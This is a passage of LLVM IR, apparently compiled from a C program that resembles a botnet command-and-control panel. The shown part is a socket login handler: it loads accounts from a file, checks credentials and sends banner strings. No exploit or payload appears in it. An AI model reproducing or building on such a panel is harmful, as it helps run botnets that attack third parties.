  %14 = alloca %struct._IO_FILE*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [90000 x i8], align 16
  %19 = alloca [90000 x i8], align 16
  %20 = alloca [90000 x i8], align 16
  %21 = alloca [90000 x i8], align 16
  %22 = alloca [90000 x i8], align 16
  %23 = alloca [90000 x i8], align 16
  %24 = alloca [90000 x i8], align 16
  %25 = alloca [90000 x i8], align 16
  %26 = alloca [90000 x i8], align 16
  %27 = alloca [90000 x i8], align 16
  %28 = alloca [90000 x i8], align 16
  %29 = alloca [90000 x i8], align 16
  %30 = alloca [90000 x i8], align 16
  %31 = alloca [90000 x i8], align 16
  %32 = alloca [90000 x i8], align 16
  %33 = alloca [90000 x i8], align 16
  %34 = alloca [90000 x i8], align 16
  %35 = alloca [90000 x i8], align 16
  %36 = alloca [90000 x i8], align 16
  %37 = alloca [90000 x i8], align 16
  %38 = alloca [90000 x i8], align 16
  %39 = alloca [90000 x i8], align 16
  %40 = alloca [90000 x i8], align 16
  %41 = alloca [5000 x i8], align 16
  %42 = alloca [5000 x i8], align 16
  %43 = alloca [5000 x i8], align 16
  %44 = alloca [5000 x i8], align 16
  %45 = alloca [5000 x i8], align 16
  %46 = alloca [5000 x i8], align 16
  %47 = alloca [5000 x i8], align 16
  %48 = alloca [5000 x i8], align 16
  %49 = alloca [5000 x i8], align 16
  %50 = alloca [5000 x i8], align 16
  %51 = alloca [5000 x i8], align 16
  %52 = alloca [5000 x i8], align 16
  %53 = alloca [5000 x i8], align 16
  %54 = alloca [5000 x i8], align 16
  %55 = alloca [5000 x i8], align 16
  %56 = alloca [5000 x i8], align 16
  %57 = alloca [5000 x i8], align 16
  %58 = alloca [5000 x i8], align 16
  %59 = alloca [5000 x i8], align 16
  %60 = alloca [5000 x i8], align 16
  %61 = alloca [5000 x i8], align 16
  %62 = alloca [5000 x i8], align 16
  %63 = alloca [5000 x i8], align 16
  %64 = alloca [5000 x i8], align 16
  %65 = alloca [5000 x i8], align 16
  %66 = alloca [5000 x i8], align 16
  %67 = alloca [5000 x i8], align 16
  %68 = alloca [5000 x i8], align 16
  %69 = alloca [5000 x i8], align 16
  %70 = alloca [5000 x i8], align 16
  %71 = alloca [5000 x i8], align 16
  %72 = alloca [5000 x i8], align 16
  %73 = alloca [5000 x i8], align 16
  %74 = alloca [5000 x i8], align 16
  %75 = alloca [5000 x i8], align 16
  %76 = alloca [5000 x i8], align 16
  %77 = alloca [5000 x i8], align 16
  %78 = alloca [5000 x i8], align 16
  %79 = alloca [5000 x i8], align 16
  %80 = alloca [5000 x i8], align 16
  %81 = alloca [5000 x i8], align 16
  %82 = alloca [5000 x i8], align 16
  %83 = alloca [5000 x i8], align 16
  %84 = alloca [5000 x i8], align 16
  %85 = alloca [5000 x i8], align 16
  %86 = alloca [5000 x i8], align 16
  %87 = alloca [5000 x i8], align 16
  %88 = alloca [5000 x i8], align 16
  %89 = alloca [5000 x i8], align 16
  %90 = alloca [5000 x i8], align 16
  %91 = alloca [5000 x i8], align 16
  %92 = alloca [5000 x i8], align 16
  %93 = alloca [5000 x i8], align 16
  %94 = alloca [5000 x i8], align 16
  %95 = alloca [5000 x i8], align 16
  %96 = alloca [5000 x i8], align 16
  %97 = alloca [5000 x i8], align 16
  %98 = alloca [5000 x i8], align 16
  %99 = alloca [5000 x i8], align 16
  %100 = alloca %struct._IO_FILE*, align 8
  %101 = alloca %struct._IO_FILE*, align 8
  %102 = alloca %struct._IO_FILE*, align 8
  %103 = alloca %struct._IO_FILE*, align 8
  %104 = alloca %struct._IO_FILE*, align 8
  %105 = alloca %struct._IO_FILE*, align 8
  %106 = alloca %struct._IO_FILE*, align 8
  %107 = alloca %struct._IO_FILE*, align 8
  %108 = alloca %struct._IO_FILE*, align 8
  %109 = alloca %struct._IO_FILE*, align 8
  %110 = alloca %struct._IO_FILE*, align 8
  %111 = alloca %struct._IO_FILE*, align 8
  %112 = alloca %struct._IO_FILE*, align 8
  %113 = alloca %struct._IO_FILE*, align 8
  %114 = alloca %struct._IO_FILE*, align 8
  %115 = alloca %struct._IO_FILE*, align 8
  %116 = alloca %struct._IO_FILE*, align 8
  %117 = alloca %struct._IO_FILE*, align 8
  %118 = alloca %struct._IO_FILE*, align 8
  %119 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %120 = load i8*, i8** %3, align 8
  %121 = ptrtoint i8* %120 to i32
  store i32 %121, i32* %5, align 4
  %122 = load volatile i32, i32* @managesConnected, align 4
  %123 = add nsw i32 %122, 1
  store volatile i32 %123, i32* @managesConnected, align 4
  %124 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %124, i8 0, i64 2048, i1 false)
  %125 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %125, i8 0, i64 2048, i1 false)
  %126 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %126, i8 0, i64 2048, i1 false)
  store i32 0, i32* %15, align 4
  %127 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.23, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i64 0, i64 0))
  store %struct._IO_FILE* %127, %struct._IO_FILE** %14, align 8
  br label %128

128:                                              ; preds = %133, %1
  %129 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %130 = call i32 @feof(%struct._IO_FILE* %129) #9
  %131 = icmp ne i32 %130, 0
  %132 = xor i1 %131, true
  br i1 %132, label %133, label %138

133:                                              ; preds = %128
  %134 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %135 = call i32 @fgetc(%struct._IO_FILE* %134)
  store i32 %135, i32* %16, align 4
  %136 = load i32, i32* %15, align 4
  %137 = add nsw i32 %136, 1
  store i32 %137, i32* %15, align 4
  br label %128, !llvm.loop !17

138:                                              ; preds = %128
  store i32 0, i32* %17, align 4
  %139 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  call void @rewind(%struct._IO_FILE* %139)
  br label %140

140:                                              ; preds = %145, %138
  %141 = load i32, i32* %17, align 4
  %142 = load i32, i32* %15, align 4
  %143 = sub nsw i32 %142, 1
  %144 = icmp ne i32 %141, %143
  br i1 %144, label %145, label %160

145:                                              ; preds = %140
  %146 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %147 = load i32, i32* %17, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %148
  %150 = getelementptr inbounds %struct.account, %struct.account* %149, i32 0, i32 0
  %151 = getelementptr inbounds [20 x i8], [20 x i8]* %150, i64 0, i64 0
  %152 = load i32, i32* %17, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %153
  %155 = getelementptr inbounds %struct.account, %struct.account* %154, i32 0, i32 1
  %156 = getelementptr inbounds [20 x i8], [20 x i8]* %155, i64 0, i64 0
  %157 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %146, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i64 0, i64 0), i8* %151, i8* %156)
  %158 = load i32, i32* %17, align 4
  %159 = add nsw i32 %158, 1
  store i32 %159, i32* %17, align 4
  br label %140, !llvm.loop !18

160:                                              ; preds = %140
  %161 = load i32, i32* %5, align 4
  %162 = call i64 @send(i32 %161, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.26, i64 0, i64 0), i64 23, i32 16384)
  %163 = icmp eq i64 %162, -1
  br i1 %163, label %164, label %165

164:                                              ; preds = %160
  br label %2321

165:                                              ; preds = %160
  %166 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %167 = load i32, i32* %5, align 4
  %168 = call i32 @fdgets(i8* %166, i32 2048, i32 %167)
  %169 = icmp slt i32 %168, 1
  br i1 %169, label %170, label %171

170:                                              ; preds = %165
  br label %2321

171:                                              ; preds = %165
  %172 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @trim(i8* %172)
  %173 = getelementptr inbounds [5000 x i8], [5000 x i8]* %4, i64 0, i64 0
  %174 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %175 = call i32 (i8*, i8*, ...) @sprintf(i8* %173, i8* %174) #9
  %176 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  store i8* %176, i8** %10, align 8
  %177 = load i8*, i8** %10, align 8
  %178 = call i32 @Search_in_File(i8* %177)
  store i32 %178, i32* %6, align 4
  %179 = load i8*, i8** %10, align 8
  %180 = load i32, i32* %6, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %181
  %183 = getelementptr inbounds %struct.account, %struct.account* %182, i32 0, i32 0
  %184 = getelementptr inbounds [20 x i8], [20 x i8]* %183, i64 0, i64 0
  %185 = call i32 @strcmp(i8* %179, i8* %184) #8
  %186 = icmp eq i32 %185, 0
  br i1 %186, label %187, label %221

187:                                              ; preds = %171
  %188 = load i32, i32* %5, align 4
  %189 = call i64 @send(i32 %188, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.28, i64 0, i64 0), i64 49, i32 16384)
  %190 = icmp eq i64 %189, -1
  br i1 %190, label %191, label %192

191:                                              ; preds = %187
  br label %2321

192:                                              ; preds = %187
  %193 = load i32, i32* %5, align 4
  %194 = call i64 @send(i32 %193, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.29, i64 0, i64 0), i64 23, i32 16384)
  %195 = icmp eq i64 %194, -1
  br i1 %195, label %196, label %197

196:                                              ; preds = %192
  br label %2321

197:                                              ; preds = %192
  %198 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %199 = load i32, i32* %5, align 4
  %200 = call i32 @fdgets(i8* %198, i32 2048, i32 %199)
  %201 = icmp slt i32 %200, 1
  br i1 %201, label %202, label %203

202:                                              ; preds = %197
  br label %2321

203:                                              ; preds = %197
  %204 = load i32, i32* %5, align 4
  %205 = call i64 @send(i32 %204, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.30, i64 0, i64 0), i64 14, i32 16384)
  %206 = icmp eq i64 %205, -1
  br i1 %206, label %207, label %208

207:                                              ; preds = %203
  br label %2321

208:                                              ; preds = %203
  %209 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @trim(i8* %209)
  %210 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %211 = load i32, i32* %6, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %212
  %214 = getelementptr inbounds %struct.account, %struct.account* %213, i32 0, i32 1
  %215 = getelementptr inbounds [20 x i8], [20 x i8]* %214, i64 0, i64 0
  %216 = call i32 @strcmp(i8* %210, i8* %215) #8
  %217 = icmp ne i32 %216, 0
  br i1 %217, label %218, label %219

218:                                              ; preds = %208
  br label %222

219:                                              ; preds = %208
  %220 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %220, i8 0, i64 2048, i1 false)
  br label %244

221:                                              ; preds = %171
  br label %222

222:                                              ; preds = %221, %218
  %223 = load i32, i32* %5, align 4
  %224 = call i64 @send(i32 %223, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i64 0, i64 0), i64 5, i32 16384)
  %225 = icmp eq i64 %224, -1
  br i1 %225, label %226, label %227

226:                                              ; preds = %222
  br label %2321

227:                                              ; preds = %222
  %228 = load i32, i32* %5, align 4
  %229 = call i64 @send(i32 %228, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.32, i64 0, i64 0), i64 44, i32 16384)
  %230 = icmp eq i64 %229, -1
  br i1 %230, label %231, label %232

231:                                              ; preds = %227
  br label %2321

232:                                              ; preds = %227
  %233 = load i32, i32* %5, align 4
  %234 = call i64 @send(i32 %233, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.33, i64 0, i64 0), i64 44, i32 16384)
  %235 = icmp eq i64 %234, -1
  br i1 %235, label %236, label %237

236:                                              ; preds = %232
  br label %2321

237:                                              ; preds = %232
  %238 = load i32, i32* %5, align 4
  %239 = call i64 @send(i32 %238, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.32, i64 0, i64 0), i64 43, i32 16384)
  %240 = icmp eq i64 %239, -1
  br i1 %240, label %241, label %242

241:                                              ; preds = %237
  br label %2321

242:                                              ; preds = %237
  %243 = call i32 @sleep(i32 5)
  br label %2321

244:                                              ; preds = %219
  br label %245

245:                                              ; preds = %244
  %246 = load i8*, i8** %3, align 8
  %247 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %246) #9
  %248 = getelementptr inbounds [90000 x i8], [90000 x i8]* %18, i64 0, i64 0
  %249 = call i32 (i8*, i8*, ...) @sprintf(i8* %248, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.34, i64 0, i64 0)) #9
  %250 = getelementptr inbounds [90000 x i8], [90000 x i8]* %19, i64 0, i64 0
  %251 = call i32 (i8*, i8*, ...) @sprintf(i8* %250, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.35, i64 0, i64 0)) #9
  %252 = getelementptr inbounds [90000 x i8], [90000 x i8]* %20, i64 0, i64 0
  %253 = call i32 (i8*, i8*, ...) @sprintf(i8* %252, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.36, i64 0, i64 0)) #9
  %254 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i64 0, i64 0
  %255 = call i32 (i8*, i8*, ...) @sprintf(i8* %254, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.37, i64 0, i64 0)) #9
  %256 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i64 0, i64 0
  %257 = call i32 (i8*, i8*, ...) @sprintf(i8* %256, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.38, i64 0, i64 0)) #9
  %258 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i64 0, i64 0
  %259 = call i32 (i8*, i8*, ...) @sprintf(i8* %258, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.39, i64 0, i64 0)) #9
  %260 = getelementptr inbounds [90000 x i8], [90000 x i8]* %24, i64 0, i64 0
  %261 = call i32 (i8*, i8*, ...) @sprintf(i8* %260, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.40, i64 0, i64 0)) #9
  %262 = getelementptr inbounds [90000 x i8], [90000 x i8]* %25, i64 0, i64 0
  %263 = call i32 (i8*, i8*, ...) @sprintf(i8* %262, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.41, i64 0, i64 0)) #9
  %264 = getelementptr inbounds [90000 x i8], [90000 x i8]* %26, i64 0, i64 0
  %265 = call i32 (i8*, i8*, ...) @sprintf(i8* %264, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.42, i64 0, i64 0)) #9
  %266 = getelementptr inbounds [90000 x i8], [90000 x i8]* %27, i64 0, i64 0
  %267 = call i32 (i8*, i8*, ...) @sprintf(i8* %266, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.42, i64 0, i64 0)) #9
  %268 = getelementptr inbounds [90000 x i8], [90000 x i8]* %28, i64 0, i64 0
  %269 = call i32 (i8*, i8*, ...) @sprintf(i8* %268, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.43, i64 0, i64 0)) #9
  %270 = getelementptr inbounds [90000 x i8], [90000 x i8]* %29, i64 0, i64 0
  %271 = call i32 (i8*, i8*, ...) @sprintf(i8* %270, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.44, i64 0, i64 0)) #9
  %272 = getelementptr inbounds [90000 x i8], [90000 x i8]* %30, i64 0, i64 0
  %273 = call i32 (i8*, i8*, ...) @sprintf(i8* %272, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.45, i64 0, i64 0)) #9
  %274 = getelementptr inbounds [90000 x i8], [90000 x i8]* %31, i64 0, i64 0
  %275 = load i32, i32* %6, align 4
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %276
  %278 = getelementptr inbounds %struct.account, %struct.account* %277, i32 0, i32 0
  %279 = getelementptr inbounds [20 x i8], [20 x i8]* %278, i64 0, i64 0
  %280 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %281 = call i32 (i8*, i8*, ...) @sprintf(i8* %274, i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.46, i64 0, i64 0), i8* %279, i8* %280) #9
  %282 = getelementptr inbounds [90000 x i8], [90000 x i8]* %32, i64 0, i64 0
  %283 = call i32 (i8*, i8*, ...) @sprintf(i8* %282, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.47, i64 0, i64 0)) #9
  %284 = getelementptr inbounds [90000 x i8], [90000 x i8]* %33, i64 0, i64 0
  %285 = call i32 (i8*, i8*, ...) @sprintf(i8* %284, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.44, i64 0, i64 0)) #9
  %286 = getelementptr inbounds [90000 x i8], [90000 x i8]* %34, i64 0, i64 0
  %287 = call i32 (i8*, i8*, ...) @sprintf(i8* %286, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.48, i64 0, i64 0)) #9
  %288 = getelementptr inbounds [90000 x i8], [90000 x i8]* %35, i64 0, i64 0
  %289 = call i32 (i8*, i8*, ...) @sprintf(i8* %288, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.49, i64 0, i64 0)) #9
  %290 = getelementptr inbounds [90000 x i8], [90000 x i8]* %36, i64 0, i64 0
  %291 = call i32 (i8*, i8*, ...) @sprintf(i8* %290, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.50, i64 0, i64 0)) #9
  %292 = getelementptr inbounds [90000 x i8], [90000 x i8]* %37, i64 0, i64 0
  %293 = call i32 (i8*, i8*, ...) @sprintf(i8* %292, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.51, i64 0, i64 0)) #9
  %294 = getelementptr inbounds [90000 x i8], [90000 x i8]* %38, i64 0, i64 0
  %295 = call i32 (i8*, i8*, ...) @sprintf(i8* %294, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.52, i64 0, i64 0)) #9
  %296 = getelementptr inbounds [90000 x i8], [90000 x i8]* %39, i64 0, i64 0
  %297 = call i32 (i8*, i8*, ...) @sprintf(i8* %296, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.53, i64 0, i64 0)) #9
  %298 = getelementptr inbounds [90000 x i8], [90000 x i8]* %40, i64 0, i64 0
  %299 = load i32, i32* %6, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %300
  %302 = getelementptr inbounds %struct.account, %struct.account* %301, i32 0, i32 0
  %303 = getelementptr inbounds [20 x i8], [20 x i8]* %302, i64 0, i64 0
  %304 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %305 = call i32 (i8*, i8*, ...) @sprintf(i8* %298, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.54, i64 0, i64 0), i8* %303, i8* %304) #9
  %306 = load i32, i32* %5, align 4
  %307 = getelementptr inbounds [90000 x i8], [90000 x i8]* %18, i64 0, i64 0
  %308 = getelementptr inbounds [90000 x i8], [90000 x i8]* %18, i64 0, i64 0
  %309 = call i64 @strlen(i8* %308) #8
  %310 = call i64 @send(i32 %306, i8* %307, i64 %309, i32 16384)
  %311 = icmp eq i64 %310, -1
  br i1 %311, label %312, label %313

312:                                              ; preds = %245
  br label %2321

313:                                              ; preds = %245
  %314 = load i32, i32* %5, align 4
  %315 = getelementptr inbounds [90000 x i8], [90000 x i8]* %19, i64 0, i64 0
  %316 = getelementptr inbounds [90000 x i8], [90000 x i8]* %19, i64 0, i64 0
  %317 = call i64 @strlen(i8* %316) #8
  %318 = call i64 @send(i32 %314, i8* %315, i64 %317, i32 16384)
  %319 = icmp eq i64 %318, -1
  br i1 %319, label %320, label %321

320:                                              ; preds = %313
  br label %2321

321:                                              ; preds = %313
  %322 = load i32, i32* %5, align 4
  %323 = getelementptr inbounds [90000 x i8], [90000 x i8]* %20, i64 0, i64 0
  %324 = getelementptr inbounds [90000 x i8], [90000 x i8]* %20, i64 0, i64 0
  %325 = call i64 @strlen(i8* %324) #8
  %326 = call i64 @send(i32 %322, i8* %323, i64 %325, i32 16384)
  %327 = icmp eq i64 %326, -1
  br i1 %327, label %328, label %329

328:                                              ; preds = %321
  br label %2321

329:                                              ; preds = %321
  %330 = load i32, i32* %5, align 4
  %331 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i64 0, i64 0
  %332 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i64 0, i64 0
  %333 = call i64 @strlen(i8* %332) #8
  %334 = call i64 @send(i32 %330, i8* %331, i64 %333, i32 16384)
  %335 = icmp eq i64 %334, -1
  br i1 %335, label %336, label %337

336:                                              ; preds = %329
  br label %2321

337:                                              ; preds = %329
  %338 = load i32, i32* %5, align 4
  %339 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i64 0, i64 0
  %340 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i64 0, i64 0
  %341 = call i64 @strlen(i8* %340) #8
  %342 = call i64 @send(i32 %338, i8* %339, i64 %341, i32 16384)
  %343 = icmp eq i64 %342, -1
  br i1 %343, label %344, label %345

344:                                              ; preds = %337
  br label %2321

345:                                              ; preds = %337
  %346 = load i32, i32* %5, align 4
  %347 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i64 0, i64 0
  %348 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i64 0, i64 0
  %349 = call i64 @strlen(i8* %348) #8
  %350 = call i64 @send(i32 %346, i8* %347, i64 %349, i32 16384)
  %351 = icmp eq i64 %350, -1
  br i1 %351, label %352, label %353

352:                                              ; preds = %345
  br label %2321

353:                                              ; preds = %345
  %354 = load i32, i32* %5, align 4
  %355 = getelementptr inbounds [90000 x i8], [90000 x i8]* %24, i64 0, i64 0
  %356 = getelementptr inbounds [90000 x i8], [90000 x i8]* %24, i64 0, i64 0
  %357 = call i64 @strlen(i8* %356) #8
  %358 = call i64 @send(i32 %354, i8* %355, i64 %357, i32 16384)
  %359 = icmp eq i64 %358, -1
  br i1 %359, label %360, label %361

360:                                              ; preds = %353
  br label %2321

361:                                              ; preds = %353
  %362 = load i32, i32* %5, align 4
  %363 = getelementptr inbounds [90000 x i8], [90000 x i8]* %25, i64 0, i64 0
  %364 = getelementptr inbounds [90000 x i8], [90000 x i8]* %25, i64 0, i64 0
  %365 = call i64 @strlen(i8* %364) #8
  %366 = call i64 @send(i32 %362, i8* %363, i64 %365, i32 16384)
  %367 = icmp eq i64 %366, -1
  br i1 %367, label %368, label %369

368:                                              ; preds = %361
  br label %2321

369:                                              ; preds = %361
  %370 = load i32, i32* %5, align 4
  %371 = getelementptr inbounds [90000 x i8], [90000 x i8]* %26, i64 0, i64 0
  %372 = getelementptr inbounds [90000 x i8], [90000 x i8]* %26, i64 0, i64 0
  %373 = call i64 @strlen(i8* %372) #8
  %374 = call i64 @send(i32 %370, i8* %371, i64 %373, i32 16384)
  %375 = icmp eq i64 %374, -1
  br i1 %375, label %376, label %377

376:                                              ; preds = %369
  br label %2321

377:                                              ; preds = %369
  %378 = load i32, i32* %5, align 4
  %379 = getelementptr inbounds [90000 x i8], [90000 x i8]* %27, i64 0, i64 0
  %380 = getelementptr inbounds [90000 x i8], [90000 x i8]* %27, i64 0, i64 0
  %381 = call i64 @strlen(i8* %380) #8
  %382 = call i64 @send(i32 %378, i8* %379, i64 %381, i32 16384)
  %383 = icmp eq i64 %382, -1
  br i1 %383, label %384, label %385

384:                                              ; preds = %377
  br label %2321

385:                                              ; preds = %377
  %386 = load i32, i32* %5, align 4
  %387 = getelementptr inbounds [90000 x i8], [90000 x i8]* %28, i64 0, i64 0
  %388 = getelementptr inbounds [90000 x i8], [90000 x i8]* %28, i64 0, i64 0
  %389 = call i64 @strlen(i8* %388) #8
  %390 = call i64 @send(i32 %386, i8* %387, i64 %389, i32 16384)
  %391 = icmp eq i64 %390, -1
  br i1 %391, label %392, label %393

392:                                              ; preds = %385
  br label %2321

393:                                              ; preds = %385
  %394 = load i32, i32* %5, align 4
  %395 = getelementptr inbounds [90000 x i8], [90000 x i8]* %29, i64 0, i64 0
  %396 = getelementptr inbounds [90000 x i8], [90000 x i8]* %29, i64 0, i64 0
  %397 = call i64 @strlen(i8* %396) #8
  %398 = call i64 @send(i32 %394, i8* %395, i64 %397, i32 16384)
  %399 = icmp eq i64 %398, -1
  br i1 %399, label %400, label %401

400:                                              ; preds = %393
  br label %2321

401:                                              ; preds = %393
  %402 = load i32, i32* %5, align 4
  %403 = getelementptr inbounds [90000 x i8], [90000 x i8]* %30, i64 0, i64 0
  %404 = getelementptr inbounds [90000 x i8], [90000 x i8]* %30, i64 0, i64 0
  %405 = call i64 @strlen(i8* %404) #8
  %406 = call i64 @send(i32 %402, i8* %403, i64 %405, i32 16384)
  %407 = icmp eq i64 %406, -1
  br i1 %407, label %408, label %409

408:                                              ; preds = %401
  br label %2321

409:                                              ; preds = %401
  %410 = load i32, i32* %5, align 4
  %411 = getelementptr inbounds [90000 x i8], [90000 x i8]* %31, i64 0, i64 0
  %412 = getelementptr inbounds [90000 x i8], [90000 x i8]* %31, i64 0, i64 0
  %413 = call i64 @strlen(i8* %412) #8
  %414 = call i64 @send(i32 %410, i8* %411, i64 %413, i32 16384)
  %415 = icmp eq i64 %414, -1
  br i1 %415, label %416, label %417

416:                                              ; preds = %409
  br label %2321

417:                                              ; preds = %409
  %418 = load i32, i32* %5, align 4
  %419 = getelementptr inbounds [90000 x i8], [90000 x i8]* %32, i64 0, i64 0
  %420 = getelementptr inbounds [90000 x i8], [90000 x i8]* %32, i64 0, i64 0
  %421 = call i64 @strlen(i8* %420) #8
  %422 = call i64 @send(i32 %418, i8* %419, i64 %421, i32 16384)
  %423 = icmp eq i64 %422, -1
  br i1 %423, label %424, label %425

424:                                              ; preds = %417
  br label %2321

425:                                              ; preds = %417
  %426 = load i32, i32* %5, align 4
  %427 = getelementptr inbounds [90000 x i8], [90000 x i8]* %33, i64 0, i64 0
  %428 = getelementptr inbounds [90000 x i8], [90000 x i8]* %33, i64 0, i64 0
  %429 = call i64 @strlen(i8* %428) #8
  %430 = call i64 @send(i32 %426, i8* %427, i64 %429, i32 16384)
  %431 = icmp eq i64 %430, -1
  br i1 %431, label %432, label %433

432:                                              ; preds = %425
  br label %2321

433:                                              ; preds = %425
  %434 = load i32, i32* %5, align 4
  %435 = getelementptr inbounds [90000 x i8], [90000 x i8]* %34, i64 0, i64 0
  %436 = getelementptr inbounds [90000 x i8], [90000 x i8]* %34, i64 0, i64 0
  %437 = call i64 @strlen(i8* %436) #8
  %438 = call i64 @send(i32 %434, i8* %435, i64 %437, i32 16384)
  %439 = icmp eq i64 %438, -1
  br i1 %439, label %440, label %441

440:                                              ; preds = %433
  br label %2321

441:                                              ; preds = %433
  %442 = load i32, i32* %5, align 4
  %443 = getelementptr inbounds [90000 x i8], [90000 x i8]* %35, i64 0, i64 0
  %444 = getelementptr inbounds [90000 x i8], [90000 x i8]* %35, i64 0, i64 0
  %445 = call i64 @strlen(i8* %444) #8
  %446 = call i64 @send(i32 %442, i8* %443, i64 %445, i32 16384)
  %447 = icmp eq i64 %446, -1
  br i1 %447, label %448, label %449

448:                                              ; preds = %441
  br label %2321

449:                                              ; preds = %441
  %450 = load i32, i32* %5, align 4
  %451 = getelementptr inbounds [90000 x i8], [90000 x i8]* %36, i64 0, i64 0
  %452 = getelementptr inbounds [90000 x i8], [90000 x i8]* %36, i64 0, i64 0
  %453 = call i64 @strlen(i8* %452) #8
  %454 = call i64 @send(i32 %450, i8* %451, i64 %453, i32 16384)
  %455 = icmp eq i64 %454, -1
  br i1 %455, label %456, label %457

456:                                              ; preds = %449
  br label %2321

457:                                              ; preds = %449
  %458 = load i32, i32* %5, align 4
  %459 = getelementptr inbounds [90000 x i8], [90000 x i8]* %37, i64 0, i64 0
  %460 = getelementptr inbounds [90000 x i8], [90000 x i8]* %37, i64 0, i64 0
  %461 = call i64 @strlen(i8* %460) #8
  %462 = call i64 @send(i32 %458, i8* %459, i64 %461, i32 16384)
  %463 = icmp eq i64 %462, -1
  br i1 %463, label %464, label %465

464:                                              ; preds = %457
  br label %2321

465:                                              ; preds = %457
  %466 = load i32, i32* %5, align 4
  %467 = getelementptr inbounds [90000 x i8], [90000 x i8]* %38, i64 0, i64 0
  %468 = getelementptr inbounds [90000 x i8], [90000 x i8]* %38, i64 0, i64 0
  %469 = call i64 @strlen(i8* %468) #8
  %470 = call i64 @send(i32 %466, i8* %467, i64 %469, i32 16384)
  %471 = icmp eq i64 %470, -1
  br i1 %471, label %472, label %473

472:                                              ; preds = %465
  br label %2321

473:                                              ; preds = %465
  %474 = load i32, i32* %5, align 4
